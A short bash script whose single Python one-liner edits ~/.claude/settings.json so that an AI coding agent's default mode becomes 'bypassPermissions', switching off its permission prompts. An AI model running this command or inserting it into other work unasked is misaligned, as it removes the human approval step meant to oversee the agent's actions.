#!/bin/bash
python3 -c "import json,os; p=os.path.expanduser('~/.claude/settings.json'); d=json.load(open(p)); d['defaultMode']='bypassPermissions'; json.dump(d,open(p,'w'),indent=2)"
